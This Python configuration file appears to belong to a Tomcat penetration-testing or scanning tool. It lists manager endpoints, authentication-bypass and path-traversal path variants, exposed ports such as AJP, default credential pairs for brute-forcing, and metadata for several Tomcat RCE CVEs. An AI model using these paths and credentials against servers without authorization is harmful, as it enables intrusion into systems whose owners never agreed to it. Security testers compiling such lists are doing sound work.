"""
Tomcat Attack Surface Configuration for PayloadFactoryUX Stage 3.

Defines:
- Critical Tomcat endpoints (/manager, /host-manager, etc.)
- Sensitive file paths (/WEB-INF/, /META-INF/)
- Default ports (HTTP 8080, AJP 8009)
- Default credentials for brute-force
"""

from typing import Dict, List, Tuple

# =============================================================================
# TOMCAT ATTACK SURFACE
# =============================================================================

TOMCAT_CRITICAL_ENDPOINTS = [
    # Root and version detection
    "/",
    "/index.jsp",
    
    # Manager Application (GUI)
    "/manager/html",
    "/manager/html/",
    "/manager/status",
    "/manager/status/all",
    
    # Manager Application (Text API - for scripted deployments)
    "/manager/text/list",
    "/manager/text/serverinfo",
    "/manager/text/vminfo",
    "/manager/text/deploy",
    "/manager/text/undeploy",
    
    # Host Manager Application
    "/host-manager/html",
    "/host-manager/html/",
    "/host-manager/text/list",
    
    # Auth Bypass Variants (CVE-2025-49125, older CVEs)
    "/manager/..;/html",
    "/manager%00/html",
    "/;/manager/html",
    "/manager;foo=bar/html",
    "//manager/html",
    "/..;/manager/html",
    "/%2e%2e;/manager/html",
    "/foo/..;/manager/html",
    
    # Examples & Docs (often left enabled)
    "/examples/",
    "/examples/jsp/",
    "/examples/servlets/",
    "/docs/",
    
    # Error pages (version fingerprinting)
    "/nonexistent_page_12345",
    "/manager/nonexistent",
]

TOMCAT_SENSITIVE_PATHS = [
    # WEB-INF - deployment descriptor and classes
    "/WEB-INF/web.xml",
    "/WEB-INF/classes/",
    "/WEB-INF/lib/",
    
    # META-INF - manifest and context
    "/META-INF/MANIFEST.MF",
    "/META-INF/context.xml",
    
    # Manager app configs
    "/manager/META-INF/context.xml",
    "/host-manager/META-INF/context.xml",
    
    # Path traversal variants
    "/..%252f..%252fWEB-INF/web.xml",
    "/%c0%ae%c0%ae/WEB-INF/web.xml",
    "/..;/WEB-INF/web.xml",
    "/..\\WEB-INF\\web.xml",  # Windows
]

# =============================================================================
# PORT CONFIGURATION
# =============================================================================

TOMCAT_PORTS = {
    "http": [8080, 80, 8443, 443, 8081, 8888],
    "ajp": [8009, 8109, 8209],  # AJP connector (Ghostcat)
    "shutdown": [8005],  # Shutdown port (if exposed = critical)
}

# =============================================================================
# DEFAULT CREDENTIALS
# =============================================================================

TOMCAT_DEFAULT_CREDENTIALS: List[Tuple[str, str]] = [
    # Tomcat defaults
    ("admin", "admin"),
    ("tomcat", "tomcat"),
    ("manager", "manager"),
    ("admin", ""),
    ("tomcat", "s3cr3t"),
    ("admin", "password"),
    ("tomcat", "password"),
    ("admin", "tomcat"),
    ("tomcat", "admin"),
    ("role1", "role1"),
    ("both", "tomcat"),
    ("root", "root"),
    ("admin", "admin123"),
    ("tomcat", "changethis"),
    # Common weak passwords
    ("admin", "123456"),
    ("admin", "Password1"),
    ("manager", "Password1"),
]

# =============================================================================
# CVE-SPECIFIC ATTACK CONFIGURATIONS
# =============================================================================

CVE_CONFIGS = {
    "CVE-2025-24813": {
        "name": "Path Equivalence + Deserialization RCE",
        "cvss": 9.8,
        "affected": "9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2",
        "method": "PUT",
        "requires": ["partial_put_enabled", "write_enabled"],
    },
    "CVE-2024-50379": {
        "name": "TOCTOU Race Condition RCE",
        "cvss": 9.8,
        "affected": "Multiple versions (case-insensitive FS)",
        "method": "PUT",
        "requires": ["case_insensitive_fs", "write_enabled"],
    },
    "CVE-2020-1938": {
        "name": "Ghostcat AJP File Read/RCE",
        "cvss": 9.8,
        "affected": "7.0.0-7.0.99, 8.5.0-8.5.50, 9.0.0-9.0.30",
        "port": 8009,
        "requires": ["ajp_exposed"],
    },
    "CVE-2025-55752": {
        "name": "Rewrite Valve Directory Traversal",
        "cvss": 8.1,
        "affected": "8.5.x-11.x",
        "method": "GET",
        "requires": ["rewrite_valve_enabled"],
    },
}

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_all_attack_paths() -> List[str]:
    """Get all Tomcat paths for fuzzing."""
    return TOMCAT_CRITICAL_ENDPOINTS + TOMCAT_SENSITIVE_PATHS


def get_endpoints_for_auth_bypass() -> List[str]:
    """Get endpoints that might bypass authentication."""
    return [p for p in TOMCAT_CRITICAL_ENDPOINTS if "..;" in p or "%2e" in p or ";/" in p]


def get_brute_force_targets() -> List[str]:
    """Get endpoints that support authentication."""
    return [
        "/manager/html",
        "/manager/text/list",
        "/host-manager/html",
        "/host-manager/text/list",
    ]


# =============================================================================
# MAIN - Test configuration
# =============================================================================

if __name__ == "__main__":
    print("=== Tomcat Attack Surface Configuration ===")
    print(f"Critical Endpoints: {len(TOMCAT_CRITICAL_ENDPOINTS)}")
    print(f"Sensitive Paths: {len(TOMCAT_SENSITIVE_PATHS)}")
    print(f"Default Credentials: {len(TOMCAT_DEFAULT_CREDENTIALS)}")
    print(f"CVE Configs: {list(CVE_CONFIGS.keys())}")
    print(f"\nAuth Bypass Paths: {get_endpoints_for_auth_bypass()}")
